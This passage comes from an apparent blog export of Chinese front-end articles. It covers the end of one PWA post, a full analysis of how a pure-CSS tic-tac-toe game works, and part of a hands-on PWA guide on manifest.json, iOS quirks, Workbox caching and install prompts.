
Android 版本（主要是看得到 splash screen..）：


結論看了今年 Google I&#x2F;O 與 Apple WWDC 後，Apple 感覺想把 App 更融入他們的系統，以後或許不會再有 App 的概念，就是 Apple。而 Google 則持續推廣 Progressive Web App，希望讓 Web 能夠更行動化，似乎都希望能夠弭平一些隔閡。
我個人是蠻希望 Progressive Web App 的方式能普及，可惜現在的瀏覽器支援度還很差，需要更多時間，但大家應該有看過這張圖：


App 從下載到安裝使用的人數差了四分之一，如果 Progressive Web App 可以起來的話，相信對使用者與開發者來說都是雙贏的局面（更多人使用、又不會佔手機空間、又不用到 app store 更新），但大廠怎麼想就不知道了…
但至少 Progressive web app 會帶給使用者更好的 web 瀏覽體驗是無庸置疑的！

資料來源
Google developer web fundamentals
html5rocks: service-worker
Google developer web app install banner

關於作者：@arvinh 前端攻城獅，熱愛數據分析和資訊視覺化
]]></content>
      <tags>
        <tag>pwa</tag>
        <tag>web app</tag>
      </tags>
  </entry>
  <entry>
    <title>解析：純 CSS 的圈圈叉叉</title>
    <url>/2019/05/25/pure-css-tic-tac-toe-analyze/</url>
    <content><![CDATA[前言在很久之前寫過一篇使用 CSS 繪圖的文章，但 CSS 能做的不僅止於此，利用 Pure CSS 製作遊戲的大有人在，像是 Pure CSS Games collection 裡面羅列的。
不過你知我知你隔壁戴眼鏡的也知，純 CSS 製作的圖畫或是遊戲，實作成本高、閱讀性不佳，也難以調教效能，幾乎無法應用到實際產品上。
可是很好玩啊！利用有限條件加上各種技巧想辦法完成預想中的效果，成就感是很大的，能夠有能力跟時間製作出這樣的作品，我覺得是很奢侈的幸福。
老實說我還沒有那個能力做到如此地步，但從觀察他人的作品就能學習到很多有趣的技巧！
今天就來分析一下在 codepen 上看到的這個純 CSS 圈圈叉叉是怎麼實做出來的：

  See the Pen 
  CSS Tic-Tac-Toe by Alvaro Montoro (@alvaromontoro)
  on CodePen.



觀察一下功能
這個作品的完成度很高，實作出來的有以下功能：

點選方格後，能夠留下不同 style 的 X 或是 O。
滑鼠 hover 到方格上時，也還能輪流出現圈圈叉叉，讓你知道現在是輪到哪個玩家。
遊戲結束時，能夠跳出選項重新玩。

對於 CSS 稍微敏銳一些，或是有看過類似作品的實作方式的讀者，應該蠻快可以猜到第一點能夠過什麼樣的技巧達成。但作者是如何讓圈圈與叉叉交替出現，我倒是無法很快想出來。
如果你也跟我一樣，別怕！
接下來我們從功能面來一步步拆解他所使用到的技巧，大家可以對照原作者程式碼看，會更好理解。
依靠純 CSS 如何在使用者點擊元素後，進而變更元素狀態呢？透過 input[type=radio] 與 :check 僞類別的結合，我們就能製造出點擊與非點擊的兩種狀態：
/* ... 省略 ... */input[id*=&#x27;-8-x&#x27;]:checked ~ #board #tile-8 div::before &#123;  content: &quot;X&quot;;  background: #004974;  color: #89dcf6;&#125;/* ... 省略 ... */input[id*=&#x27;-8-o&#x27;]:checked ~ #board #tile-8 div::before &#123;  content: &quot;O&quot;;  background: #a60011;  color: #ffc7b5;&#125;

從原作程式碼中，可以看到有許多類似 pattern 的 selector，其中上面這兩種就是在處理 X 玩家與 O 玩家各自點擊了 board 上的一個空格後，該進行的 CSS 樣式改變。
input[id*=&#39;-8-x&#39;]，代表的是 **選取所有 id attribute 中『包含』字串 ‘-8-x’ 的 input 元素 **。接著加上 :check 就能 filter 出被使用者選取的 input 元素。
而後面的 ~ #board #tile-8 div::before 則是表示，在符合上面條件的 input 元素下的所有符合 #board #tile-8 div 的 div 內，我們加上一個 ::before 僞元素，並且設定其 css 為 content: &quot;X&quot;。
這樣的一段 CSS selector 被觸發後，就可以達到點擊後留下 X 標記的效果了：

從中可以明顯看出，作者是利用 -o 與 -x 這兩種 postfix 當作 X 玩家與 O 玩家的曲別，今天若是 id attribute 中含有 -0 的 input 元素被點選，就是 O 玩家點擊空格，得放入 O。
此外，由於 input[type=radio] 元素，在瀏覽器中的固定樣式就是一個圓形選擇鈕，要替換成井字空格，並且又能觸發點擊的方式，就是結合 form 與 label 元素，綁定對應的 input 按鈕：
&lt;form id=&quot;tictactoe&quot;&gt;  &lt;input type=&quot;radio&quot; name=&quot;cell-0&quot; id=&quot;cell-0-x&quot; /&gt;  &lt;input type=&quot;radio&quot; name=&quot;cell-0&quot; id=&quot;cell-0-o&quot; /&gt;  &lt;!-- ... 省略 ... --&gt;  &lt;input type=&quot;radio&quot; name=&quot;cell-8&quot; id=&quot;cell-8-x&quot; /&gt;  &lt;input type=&quot;radio&quot; name=&quot;cell-8&quot; id=&quot;cell-8-o&quot; /&gt;  &lt;div id=&quot;board&quot; class=&quot;center&quot;&gt;    &lt;div class=&quot;tile&quot; id=&quot;tile-0&quot;&gt;      &lt;label for=&quot;cell-0-x&quot;&gt;&lt;/label&gt;      &lt;label for=&quot;cell-0-o&quot;&gt;&lt;/label&gt;      &lt;div&gt;&lt;/div&gt;    &lt;/div&gt;    &lt;!-- ... 省略 ... --&gt;    &lt;div class=&quot;tile&quot; id=&quot;tile-8&quot;&gt;      &lt;label for=&quot;cell-8-x&quot;&gt;&lt;/label&gt;      &lt;label for=&quot;cell-8-o&quot;&gt;&lt;/label&gt;      &lt;div&gt;&lt;/div&gt;    &lt;/div&gt;  &lt;/div&gt;  &lt;!-- ... 省略 ... --&gt;&lt;/form&gt;

如此一來，我們可以把 input 按鈕藏到畫面看不到的地方，然後輕易套用任何 style 到 label 上頭，做出井字空格。
input[type=&quot;radio&quot;] &#123;  position: absolute;  top: -9999em; /* 藏到畫面外 */&#125;

Hover 出後出現額外元素很常見，但怎麼讓他交替出現不同元素？好，知道怎麼透過 input[type=radio] 來更改空格狀態之後，我們來研究作者是如何透過 Hover 後的不同樣式，呈現出 X 玩家與 O 玩家輪流的感覺呢？
要在游標 hover 時出現元素，就是結合僞類別與僞元素來在 Hover 到的空格上加入 X 或 O。：
.tile label[for$=&#x27;-o&#x27;]:hover::before &#123;  content: &quot;O&quot;;&#125;.tile label[for$=&#x27;-x&#x27;]:hover::before &#123;  content: &quot;X&quot;;&#125;

到這邊為止都不稀奇，不過還無法理解為何可以交替出現。
解答在原始碼中這段看起來很可怕的 css：
label[for$=&#x27;-x&#x27;] &#123;  z-index: 1;&#125;input:checked ~ #board label[for$=&#x27;-o&#x27;] &#123;  z-index: 2;&#125;input:checked ~ input:checked ~ #board label[for$=&#x27;-x&#x27;] &#123;  z-index: 3;&#125;input:checked ~ input:checked ~ input:checked ~ #board label[for$=&#x27;-o&#x27;] &#123;  z-index: 4;&#125;/* ... 省略一段 z-index 5 ~ 8 ... */input:checked ~ input:checked ~ input:checked ~ input:checked ~ input:checked ~ input:checked ~ input:checked ~ input:checked ~ #board label[for$=&#x27;-x&#x27;] &#123;  z-index: 9;

前面我們有提到，作者是利用 label 來做出井字空格以及 hover 後呈現的 X 與 O 符號，而在 html 中可以看到每個空格底下都有這樣的結構：
&lt;div class=&quot;tile&quot; id=&quot;tile-0&quot;&gt;  &lt;label for=&quot;cell-0-x&quot;&gt;&lt;/label&gt;  &lt;label for=&quot;cell-0-o&quot;&gt;&lt;/label&gt;  &lt;div&gt;&lt;/div&gt;&lt;/div&gt;

搭配上方的 CSS，我們就能知道作者是透過更改 label 的 z-index 來交替地觸發 .tile label[for$=&#39;-o&#39;]:hover::before 與 .tile label[for$=&#39;-x&#39;]:hover::before，進而達到想要的效果。
至於控制的方式就是透過 :check 為 true 的 input 數量：
當沒有任何一個 radio input 被 check 時，設定所有 for attribute 結尾為 -x 的 label 的 z-index 為 1，就會讓游標 hover 到空格時，會是 &lt;label for=&quot;cell-0-x&quot;&gt;&lt;/label&gt; 的 hover 被觸發，而不是 &lt;label for=&quot;cell-0-o&quot;&gt;&lt;/label&gt;。
若有一個 radio input 被選擇後，代表要換成 O 玩家，input:checked ~ #board label[for$=&#39;-o&#39;] 就被觸發了，所有 for attribute 結尾為 -o 的 label 的 z-index 變為 2，大於剛剛的 x label，這時使用者在 hover 到任何一個空格時，出現的就通通都會是 O 了！
雖然這樣的做法讓 CSS 蠻冗長的，但還是不得不讚嘆作者能想出利用 z-index 來製造出這樣的效果，真的很厲害啊…閱讀性也算很高的。
判斷輸贏以及重新遊玩的功能怎麼實作？在遊戲結束的時候，不管是哪種結果，畫面上都會疊上一層訊息與重新遊玩的按鈕，這部分的 html 藏在最下方含有 end class name 的 div 內：
&lt;div id=&quot;end&quot;&gt;  &lt;div id=&quot;message&quot; class=&quot;center&quot;&gt;    &lt;div&gt;      &lt;input type=&quot;reset&quot; for=&quot;tictactoe&quot; value=&quot;Play again&quot; /&gt;    &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;

由於整個遊戲都是包含在一個 form 中，所以可以直接透過 type 為 reset 的 input 按鈕來重設所有的 radio button 狀態，達到重新遊玩的功能。
而顯示訊息框以及判斷輸贏的方法其實蠻暴力的，就是一一檢查各種組合，橫的、直的與斜的：
#cell-0-x:checked ~ #cell-1-x:checked ~ #cell-2-x:checked ~ #end #message::before,#cell-3-x:checked ~ #cell-4-x:checked ~ #cell-5-x:checked ~ #end #message::before,#cell-6-x:checked ~ #cell-7-x:checked ~ #cell-8-x:checked ~ #end #message::before,#cell-0-x:checked ~ #cell-3-x:checked ~ #cell-6-x:checked ~ #end #message::before,#cell-1-x:checked ~ #cell-4-x:checked ~ #cell-7-x:checked ~ #end #message::before,#cell-2-x:checked ~ #cell-5-x:checked ~ #cell-8-x:checked ~ #end #message::before,#cell-0-x:checked ~ #cell-4-x:checked ~ #cell-8-x:checked ~ #end #message::before,#cell-2-x:checked ~ #cell-4-x:checked ~ #cell-6-x:checked ~ #end #message::before &#123;  content: &quot;Player 1 won!&quot;;&#125;#cell-0-o:checked ~ #cell-1-o:checked ~ #cell-2-o:checked ~ #end #message::before,#cell-3-o:checked ~ #cell-4-o:checked ~ #cell-5-o:checked ~ #end #message::before,#cell-6-o:checked ~ #cell-7-o:checked ~ #cell-8-o:checked ~ #end #message::before,#cell-0-o:checked ~ #cell-3-o:checked ~ #cell-6-o:checked ~ #end #message::before,#cell-1-o:checked ~ #cell-4-o:checked ~ #cell-7-o:checked ~ #end #message::before,#cell-2-o:checked ~ #cell-5-o:checked ~ #cell-8-o:checked ~ #end #message::before,#cell-0-o:checked ~ #cell-4-o:checked ~ #cell-8-o:checked ~ #end #message::before,#cell-2-o:checked ~ #cell-4-o:checked ~ #cell-6-o:checked ~ #end #message::before &#123;  content: &quot;Player 2 won!&quot;;&#125;

並將含有 end class 的 div 設為 display: block，當然，也是要確定所有 checked 狀態都是正確的（已經結束）：
input:checked ~ input:checked ~ input:checked ~ input:checked ~ input:checked ~ input:checked ~ input:checked ~ input:checked ~ input:checked ~ #end,#cell-0-x:checked ~ #cell-1-x:checked ~ #cell-2-x:checked ~ #end,#cell-3-x:checked ~ #cell-4-x:checked ~ #cell-5-x:checked ~ #end,#cell-6-x:checked ~ #cell-7-x:checked ~ #cell-8-x:checked ~ #end,#cell-0-x:checked ~ #cell-3-x:checked ~ #cell-6-x:checked ~ #end,#cell-1-x:checked ~ #cell-4-x:checked ~ #cell-7-x:checked ~ #end,#cell-2-x:checked ~ #cell-5-x:checked ~ #cell-8-x:checked ~ #end,#cell-0-x:checked ~ #cell-4-x:checked ~ #cell-8-x:checked ~ #end,#cell-2-x:checked ~ #cell-4-x:checked ~ #cell-6-x:checked ~ #end,#cell-0-o:checked ~ #cell-1-o:checked ~ #cell-2-o:checked ~ #end,#cell-3-o:checked ~ #cell-4-o:checked ~ #cell-5-o:checked ~ #end,#cell-6-o:checked ~ #cell-7-o:checked ~ #cell-8-o:checked ~ #end,#cell-0-o:checked ~ #cell-3-o:checked ~ #cell-6-o:checked ~ #end,#cell-1-o:checked ~ #cell-4-o:checked ~ #cell-7-o:checked ~ #end,#cell-2-o:checked ~ #cell-5-o:checked ~ #cell-8-o:checked ~ #end,#cell-0-o:checked ~ #cell-4-o:checked ~ #cell-8-o:checked ~ #end,#cell-2-o:checked ~ #cell-4-o:checked ~ #cell-6-o:checked ~ #end &#123;  display: block;&#125;

主要的實作重點大概就到這邊，剩下還有一些像是 radio button 被 check 後，把原有 label 設為 display: none 的部分就是為了讓畫面更好看而已，實作方式跟上面的 selector 都大同小異。
實作技巧整理最後稍微統整一下實作的技巧：

實作技巧 1 - 善用 form 元素： input[type=radio] 與 label
利用 radio button 來達成切換狀態的操作，在各種以純 CSS 製作的應用中，幾乎是必備出現的技巧，這邊也不例外。
透過 input 元素，我們可以從 :check 這個 Pseudo-class 來判斷使用者的點擊與否。

實作技巧 2 - CSS selector 可不是只有 id 與 class
活用 attribute selector 與 僞元素、僞類別，可以帶來很多意想不到的妙用，像是 label[for$=&#39;-o&#39;] 與 :check 等等。

實作技巧 3 - 藏東西不是只能用 display，還有 z-index 呢
利用 z-index 的階層關係，控制觸發 hover 的元素，讓我們多了一種隱藏物件的方式。

實作技巧 4 - CSS Grid
雖然在前面並沒有提到，但作者是利用 CSS Grid 畫出表格，這在 Modern web browser 上是最經濟實惠的方法：
&lt;div id=&quot;board&quot; class=&quot;center&quot;&gt;    &lt;div class=&quot;tile&quot; id=&quot;tile-0&quot;&gt;      &lt;div&gt;&lt;/div&gt;    &lt;/div&gt;    &lt;div class=&quot;tile&quot; id=&quot;tile-1&quot;&gt;      &lt;div&gt;&lt;/div&gt;    &lt;/div&gt;    &lt;!--       ...  依此類推將九個格子填滿    --&gt;  &lt;/div&gt;

/*... 省略*/#board &#123;  width: 50vmin;  height: 50vmin;  display: grid;  grid-template-columns: 1fr 1fr 1fr;  grid-template-rows: 1fr 1fr 1fr;&#125;#tile-0 &#123;  grid-column: 1;  grid-row: 1;&#125;#tile-1 &#123;  grid-column: 2;  grid-row: 1;&#125;/*... 省略*/

結論每每看到 codepen 上一些神奇的作品，都會讓我有 mind-blowing 的感覺，雖然大多時候難以理解實作原理，但偶而還是會看到類似這次範例一般，好理解，又能學到不少技巧的作品。希望對 CSS 不那麼熟悉的讀者，透過這次的分析，也能看得懂背後的原理，然後對利用 CSS 繪圖或是製作 no-js 的作品有所興趣，雖然沒什麼實際用途，但我自己覺得能夠利用專業玩出一些好玩的東西真的蠻吸引人的！
資料來源
CSS Tic-Tac-Toe - Alvaro Montoro

關於作者：@arvinh 前端攻城獅，熱愛數據分析和資訊視覺化
]]></content>
      <tags>
        <tag>css</tag>
      </tags>
  </entry>
  <entry>
    <title>PWA 實戰經驗分享</title>
    <url>/2018/10/13/pwa-in-action/</url>
    <content><![CDATA[前言前些日子在忙公司的產品改版，從原本的 PHP 換成後端 Go + 前端 React SPA，分成桌面版跟手機版兩個不同的 Project，而既然都改版了，自然要把最新最潮的 PWA 也放在目標裡面，之前耳聞 PWA 很久但卻沒有實作過的我也有了機會來嘗試這個東西。
如今產品已經改版完畢且上線了兩三個月，慢慢穩定下來，在優化 PWA 的過程中也讓我有了一些心得可以讓大家分享。
在舉一些實際案例之前，先讓我們來談談到底怎樣才算是 PWA。
PWA 到底是什麼？從 Google 官方的文件：你的首個 Progressive Web App 中可以看出 PWA 的一些詳細定義，但我不太喜歡這種制式的規則，對我來說，PWA 就是一個很像 Native App 的 Web App，而其中瀏覽器的支援也佔了很大的一部分。
在以往儘管你的網站做得再怎麼像 Native App，你還是有兩個難關沒辦法克服：離線的時候就 GG 以及沒辦法安裝在手機上，所以不管怎麼看，人家都知道你就是個 Web App，永遠都不會長得像 Native。
可是自從瀏覽器開始支援 Service Worker 以及 manifest 之後，上面這兩點就被克服了！得益於 Service Worker，讓網頁離線的時候也能夠運作，可以自己寫 code 來決定要渲染什麼畫面；而瀏覽器的「新增到主畫面」的功能更是讓安裝 Web App 成為可能，開發者也可以用 manifest.json 來自訂一些內容，像是啟動畫面以及安裝在主畫面上的名稱等等。
對我來說，如果你能夠利用上面這兩項技術，讓你的 Web App 成功安裝在手機上並且看起來跟 Native App 沒兩樣，我覺得就能稱作是 PWA。
我在之前的文章（原來 CORS 沒有我想像中的簡單）已經有分享過 PWA 在手機上面的樣子了，這邊就不再贅述。還記得我第一次體驗安裝 PWA 的時候也被嚇到了，因為看起來就跟 Native App 沒兩樣，如果真的做得好，應該是很難區分出來的。明明是個網頁可是看起來卻跟 Native App 一樣，這就是 PWA。
接著來介紹幾個 PWA 的重要因素，你要做 PWA 就一定要有下面幾個東西。
manifest.json首先先來談manifest.json，有寫過 Android 的都知道有個東西叫做AndroidManifest.xml，其實兩個本質上是一樣的東西，就是去描述這個 App 的一些特性。
我們先來看看 Google 官方文件：The Web App Manifest裡面給的範例：
&#123;  &quot;short_name&quot;: &quot;Maps&quot;,  &quot;name&quot;: &quot;Google Maps&quot;,  &quot;icons&quot;: [    &#123;      &quot;src&quot;: &quot;/images/icons-192.png&quot;,      &quot;type&quot;: &quot;image/png&quot;,      &quot;sizes&quot;: &quot;192x192&quot;    &#125;,    &#123;      &quot;src&quot;: &quot;/images/icons-512.png&quot;,      &quot;type&quot;: &quot;image/png&quot;,      &quot;sizes&quot;: &quot;512x512&quot;    &#125;  ],  &quot;start_url&quot;: &quot;/maps/?source=pwa&quot;,  &quot;background_color&quot;: &quot;#3367D6&quot;,  &quot;display&quot;: &quot;standalone&quot;,  &quot;scope&quot;: &quot;/maps/&quot;,  &quot;theme_color&quot;: &quot;#3367D6&quot;&#125;

裡面給的資訊很簡單，然後會跟你把 PWA 新增到主畫面時出現的東西息息相關。name的話就是你 App 的名稱，他在主畫面上面就會顯示這個name，但如果你也有提供short_name的話會優先使用short_name。
再來icons就是主畫面上面會出現的 logo 囉，這沒什麼好多談的。start_url則是你從主畫面上開啟時會連線到的地方，很多人會加個?source=pwa之類的，這樣就可以知道這個使用者是使用 PWA，方便做一些統計。
這邊有個小地方要注意，那就是在某一版的 iOS Safari（抱歉我忘記是哪一版，但總之最新的已經沒有這個問題了），它是不會遵守start_url的！他會根據的是你在安裝 PWA 時的網址，例如說你在https://example.com/test/123的時候按下「新增到主畫面」，你在主畫面開啟 PWA 時就會連線到這個畫面。
這部分其實滿困擾的，但幸好最新的 iOS Safari 已經沒有這個問題了，大家可以不用擔心。
還有一個要特別提的就是name、background_color跟icon會自動組成Splash screens，就是你在打開 PWA 的時候會看到的一個畫面，是由這三個資訊自動被 Chrome 所組成的，意思就是你沒辦法客製化這個啟動畫面。
它就是會顯示你指定的背景顏色、然後中間放一個 icon 下面放你 App 的名稱，沒有其他東西可以調了，至少現在是這樣。
在這點上面 iOS 就不一樣，iOS 是不支援這種啟動畫面的，但好處就是你可以自己透過 html 的 tag 來設定！
&lt;link    rel=&#x27;apple-touch-startup-image&#x27;    href=&#x27;/assets/splash/splash-1125x2436.png&#x27;    media=&#x27;(device-width: 375px) and (device-height: 812px) and (-webkit-device-pixel-ratio: 3) and (orientation: portrait)&#x27;/&gt;

會有一些尺寸相關的設定你因為要幫每一種不同的 device 都準備一張圖片，詳情可參考：Progressive Web App Splash Screens 或是 Few Tips That Will Make Your PWA on iOS Feel Like Native。
iOS 跟 Android 的差別在於 iOS 的啟動畫面你可以放一張圖片，因此可以完全客製化，你想放什麼就放什麼，自由度比 Android 來得高。
還有就是 icon 的部分，iOS 也不會看你mainfest.json的設定，而是會看自己的 html tag，所以你必須額外設置給 iOS 使用的 icon：
&lt;link    rel=&#x27;apple-touch-icon&#x27;    sizes=&#x27;192x192&#x27;    href=&#x27;/assets/favicons/iOS192x192.png&#x27;/&gt;

對於manifest.json，該注意的點差不多就這些。其實最大的問題還是支援度，所以 Google 出了一個PWACompat，可以自動幫你針對舊的瀏覽器調整你的檔案以及 html 的 tag，不過也有人寫了一篇：You shouldn’t use Chrome’s PWACompat library in your Progressive Web Apps 來告訴大家不要用，論點大概是不能這樣一概論之，你必須針對每種不同的平台跟瀏覽器去了解他的差異再來做適配，才能得到最好的使用者體驗，這種統一調整的做法會在很多地方看起來 ok 但是怪怪的。
既然上面都提到 iOS 了，就來講講 iOS 的一些不同之處。其實 iOS 開始提供 PWA 的支援是今年（2018 年）的事情而已，而且剛推出的時候支援度滿差的，不過有在慢慢改善就是了。
關於那些 iOS 不同的地方，這兩篇文章都講得很清楚了：PWAs are coming to iOS 11.3: Cupertino, we have a problem、Progressive Web Apps on iOS are here 🚀。
最大的差異之一大概就是很多時候都不看manifest.json，你要自己額外設置一些相對應的 html tag 才有用，這點是要特別注意的。
再來就是&lt;meta name=”apple-mobile-web-app-capable” content=”yes”&gt;這個 tag 也很重要，主要是告訴瀏覽器説：「我準備好提供全螢幕的體驗了，就算隱藏瀏覽器的 UI 也沒關係」，而這篇：Don’t use iOS meta tags irresponsibly in your Progressive Web Apps 則告訴你千萬不要濫用這個 tag，不然你的 Web App 在 Safari 上的體驗會變得很差，因為很多東西都不支援。
至於 Safari 最大的一點問題我直接引用上面 PWAs are coming to iOS 11.3: Cupertino, we have a problem 的其中一段：

Also, it’s a massive problem for apps with two-factor authentication, such as Twitter. If you need to go to another app to get a token or to open a text message or an email, you will get out of the PWA. When you go back to paste the code, you are out of context and, you need to start the login process again losing the validity of that code. It happened to me on Twitter! Which means, the Twitter PWA on iOS is completely unusable for me.

這是什麼意思呢？我直接舉一個實際範例，假如你的 PWA 有提供 Facebook 登入的功能而且是用重新導向的方式，你一點下去他就會開一個新的 Safari 視窗連到 Facebook 讓你授權，可是當你授權完之後回到 PWA，你會發現什麼事情都沒發生。
這一點真的超傷，而且現在應該都還沒修好，只能期待 Safari 之後會把問題修掉了。而 Android Chrome 則是會在同一個視窗底下打開 Facebook，因此結束之後能夠順利完成登入流程。
有關於 iOS 的問題跟manifest.json的注意事項差不多就到這邊，再來我們談談 PWA 的第二個重點：Service Worker。
Service Worker加入 Service Worker 的目的就只有一個，那就是快取。透過 Service Worker（以下簡稱 SW），可以幫助我們在發送 request 之前就先攔截到並且做處理，而離線運行的原理也是這樣的，我們先在第一次開啟時註冊 SW，並且利用 SW 下載靜態檔案並快取住，之後若使用者離線，我們再用已經快取住的檔案來回覆，就不會發送真的 request，自然也不會發生無法連線的情況。
而 Google 有提供了一個方便的工具：Workbox 來幫助我們自動產生出 SW 以及利用更方便的語法來攔截 request。
舉例來說，我自己用的是 Webpack 的 plugin：
new workboxPlugin.InjectManifest(&#123;    swSrc: path.join(__dirname, &#x27;..&#x27;, SRC_DIR, &#x27;sw.js&#x27;),    swDest: path.join(__dirname, &#x27;..&#x27;, DIST_DIR, &#x27;sw.js&#x27;),    globDirectory: path.join(__dirname, &#x27;..&#x27;, DIST_DIR),    globPatterns: [&#x27;**/*.&#123;js,css&#125;&#x27;]&#125;),  //sw.jslet precacheList = self.__precacheManifest || []workbox.precaching.precacheAndRoute(precacheList)

只要這樣一寫，就會自動去找符合規則的檔案並且加入快取清單裡面，你只要一註冊 SW 的時候就會把那些檔案給快取起來。
除此之外呢，Workbox 也可以針對 URL 來監聽：
// sw.jsworkbox.routing.registerRoute(/(https?:\/\/)(.*)\/api\/(.*)/, args =&gt;    workbox.strategies        .networkFirst(&#123;            cacheName: &#x27;data-cache&#x27;,            plugins: [                new workbox.expiration.Plugin(&#123;                    maxEntries: 100,                    maxAgeSeconds: 2592000                &#125;)            ]        &#125;)        .handle(args)        .then(response =&gt; &#123;            return response        &#125;)        .catch(err =&gt; &#123;            console.log(&#x27;err:&#x27;, err)        &#125;))

像上面的程式碼就是針對路徑中含有api的 request 做快取，這樣在離線時也可以利用以前快取住的 API response。
Workbox 針對這種動態的快取提供幾種策略，分別是：staleWhileRevalidate、cacheFirst、networkFirst、networkOnly 與cacheOnly，其實看名字就可以大概理解策略是什麼了，想知道詳細的內容可以參考官方文件：Workbox Strategies。
總之自從有了 Workbox 之後，基本上就不用自己手寫 SW 了，都靠著它提供的 API 以及功能就行了，就可以自動產生出符合需求的 SW。
Add to home screen banner最後要來談的是「安裝 PWA」這一塊，在 iOS Safari 上面別無他法，就只能自己叫出選單然後選取「Add to home screen」，可是在 Android Chrome 上面，如果你符合一定的條件（有設置mainfest.json以及有註冊 Service Worker），就會自動幫你跳出一個可愛的 Install banner。
（圖片來自：Changes to Add to Home Screen Behavior）
根據 Chrome 版本的不同，行為也有所不同。
在 Chrome 67（含）以前的版本，如果你在beforeinstallprompt事件裡面沒有特別用preventDefault()，或是顯式的呼叫了prompt()，就會出現最左邊那個頗大的 A2HS banner。
然後在 Chrome 68（含）之後的版本，無論你做了什麼，系統都會自動出現那個 Mini-infobar，但如果使用者關掉的話，要隔三個月才會再出現一次，實在是有夠久。
接著呢，上面這兩個 A2HS banner 跟 Mini-infobar，使用者點擊之後都會出現最右邊的 A2HS Dialog，提示使用者要不要安裝 PWA。
但是在 Chrome 68 以後，你也可以利用程式去呼叫beforeinstallprompt裡面拿到的event.prompt()把這個 dialog 顯示出來。
聽起來有點複雜對吧？
先來介紹beforeinstallprompt這個 event 好了，這個 event 在一切都準備就緒，確認你滿足條件可以顯示 prompt 的時候會被觸發，會傳來一個 event，你可以阻止顯示 prompt，把這個 event 存起來：
// 此範例來自上面的官方文件let installPromptEvent;  window.addEventListener(&#x27;beforeinstallprompt&#x27;, (event) =&gt; &#123;  // Prevent Chrome &lt;= 67 from automatically showing the prompt  event.preventDefault();  // Stash the event so it can be triggered later.  installPromptEvent = event;  // Update the install UI to notify the user app can be installed  document.querySelector(&#x27;#install-button&#x27;).disabled = false;&#125;);

為什麼要存起來呢？因為使用者可能不想一打開網站就看到這個彈窗，或者他可能正在結帳結果你跳這個東西來干擾他，所以先把它存起來，等適當的時機再呼叫installPromptEvent.prompt()來跳出 Dialog。
但要注意的事情是你直接呼叫installPromptEvent.prompt()是沒用的，你必須要within a user gesture，意思就是你要放在按鈕的 click 事件（或其他由使用者觸發的事件）裡才有效，直接呼叫是沒有用的，而且會看到 console 跳出錯誤訊息。
我之前一度很好奇它是怎麼做判斷的，後來發現原來有event.isTrusted可以用，可以判斷一個事件是不是被使用者主動觸發的，參考資料：MDN - Event.isTrusted。
總之呢，因為在不同版本上的 Chrome 有不同行為，所以最後我們決定用下面的程式碼針對不同版本有不同的反應：
// 把 event 存起來var installPromptEvent  // 要顯示 prompt 的延遲var showTime = 30 * 1000  window.addEventListener(&#x27;beforeinstallprompt&#x27;, function (e) &#123;  e.preventDefault()  installPromptEvent = e  var data = navigator.userAgent.match(/Chrom(e|ium)\\/([0-9]+)\\./)  var version = (data &amp;&amp; data.length &gt;= 2) ? parseInt(data[2], 10) : null  if (version &amp;&amp; installPromptEvent.prompt) &#123;      // 延遲一段時間才顯示 prompt    setTimeout(function() &#123;        // 如果 Chrome 版本是 67（含）以下，可以直接呼叫        if (version &lt;= 67) &#123;            installPromptEvent.prompt()            return        &#125;          // 否則的話必須透過 user action 主動觸發        // 這邊幫 #root 加上 event listener，代表點擊螢幕任何一處都會顯示 prompt        document.querySelector(&#x27;#root&#x27;).addEventListener(&#x27;click&#x27;, addToHomeScreen)        &#125;, showTime)  &#125;&#125;);  function addToHomeScreen(e) &#123;    if (installPromptEvent) &#123;        installPromptEvent.prompt()        installPromptEvent = null        document.querySelector(&#x27;#root&#x27;).removeEventListener(&#x27;click&#x27;, addToHomeScreen)     &#125;&#125;

如果是 67 以下，直接呼叫就可以顯示 prompt，否則的話還要再一步，要加個 event listener 才行，而我們也選擇延遲 30 秒才顯示。
出乎意料地，這樣一個小改動帶來驚人的成長，原本一天大概才 20、30 個人安裝 PWA，經過這樣調整之後瞬間變成八到十倍，看到 GA 的那個統計圖我也嚇了一跳，沒想到效果這麼好。
與其一直積極地要別人快點安裝 PWA，還不如只要求真的對你產品有興趣（停留超過 30 秒鐘）的人。
manifest 觀摩最後我們來看看幾個知名的 PWA 都是怎麼寫他們的manifest.json。
第一個是 PWA 界中很有名的 flipkart：
&#123;    &quot;name&quot;: &quot;Flipkart Lite&quot;,    &quot;short_name&quot;: &quot;Flipkart Lite&quot;,    &quot;icons&quot;: [        &#123;            &quot;src&quot;: &quot;https://img1a.flixcart.com/www/linchpin/batman-returns/logo_lite-cbb3574d.png&quot;,            &quot;sizes&quot;: &quot;192x192&quot;,            &quot;type&quot;: &quot;image/png&quot;        &#125;    ],    &quot;gcm_sender_id&quot;: &quot;656085505957&quot;,    &quot;gcm_user_visible_only&quot;: true,    &quot;start_url&quot;: &quot;/?start_url=homescreenicon&quot;,    &quot;permissions&quot;: [        &quot;gcm&quot;    ],    &quot;orientation&quot;: &quot;portrait&quot;,    &quot;display&quot;: &quot;standalone&quot;,    &quot;theme_color&quot;: &quot;#2874f0&quot;,    &quot;background_color&quot;: &quot;#2874f0&quot;&#125;

再來是鼎鼎大名的 twitter：
&#123;  &quot;background_color&quot;: &quot;#ffffff&quot;,  &quot;description&quot;: &quot;It&#x27;s what&#x27;s happening. From breaking news and entertainment, sports and politics, to big events and everyday interests.&quot;,  &quot;display&quot;: &quot;standalone&quot;,  &quot;gcm_sender_id&quot;: &quot;49625052041&quot;,  &quot;gcm_user_visible_only&quot;: true,  &quot;icons&quot;: [    &#123;      &quot;src&quot;: &quot;https://abs.twimg.com/responsive-web/web/ltr/icon-default.604e2486a34a2f6e.png&quot;,      &quot;sizes&quot;: &quot;192x192&quot;,      &quot;type&quot;: &quot;image/png&quot;    &#125;,    &#123;      &quot;src&quot;: &quot;https://abs.twimg.com/responsive-web/web/ltr/icon-default.604e2486a34a2f6e.png&quot;,      &quot;sizes&quot;: &quot;512x512&quot;,      &quot;type&quot;: &quot;image/png&quot;    &#125;  ],  &quot;name&quot;: &quot;Twitter&quot;,  &quot;share_target&quot;: &#123;    &quot;action&quot;: &quot;compose/tweet&quot;,    &quot;params&quot;: &#123;      &quot;title&quot;: &quot;title&quot;,      &quot;text&quot;: &quot;text&quot;,      &quot;url&quot;: &quot;url&quot;    &#125;  &#125;,  &quot;short_name&quot;: &quot;Twitter&quot;,  &quot;start_url&quot;: &quot;/&quot;,  &quot;theme_color&quot;: &quot;#ffffff&quot;,  &quot;scope&quot;: 